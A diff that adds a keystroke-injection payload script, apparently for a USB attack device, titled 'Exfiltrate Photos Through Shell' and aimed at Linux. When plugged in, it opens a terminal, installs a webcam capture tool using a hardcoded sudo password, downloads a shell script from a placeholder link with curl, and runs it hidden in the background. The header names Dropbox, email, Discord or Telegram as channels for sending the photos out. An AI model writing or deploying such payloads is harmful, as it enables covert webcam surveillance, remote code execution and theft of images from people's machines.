@@ -1,0 +1,52 @@
+
+REM ##################################################
+REM #                                                |
+REM # Title        : Exfiltrate Photos Through Shell |
+REM # Author       : Aleff                           |
+REM # Version      : 1.0                             |
+REM # Category     : Exfiltration                    |
+REM # Target       : Linux                           |
+REM #                                                |
+REM ##################################################
+
+REM Requirements:
+REM     - EXFILTRATION:
+REM         - Internet Connection
+REM         - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
+REM     - PERMISSIONS:
+REM         - for install 'fswebcam'
+REM         - for script.sh permission
+
+REM REQUIRED - replace example.com with your script.sh link
+DEFINE SCRIPT-SH-LINK example.com
+REM REQUIRED - sudo Password
+DEFINE SUDO-PSWD example
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+STRING sudo apt install fswebcam -y
+ENTER
+DELAY 500
+STRING SUDO-PSWD
+ENTER
+DELAY 5000
+
+
+REM #### Script ####
+
+
+STRING curl 
+STRING SCRIPT-SH-LINK
+STRING  > script.sh
+ENTER
+DELAY 4000
+
+STRING sudo chmod +x script.sh
+ENTER
+DELAY 500
+
+STRING nohup ./script.sh > /dev/null 2>&1 & exit
+ENTER
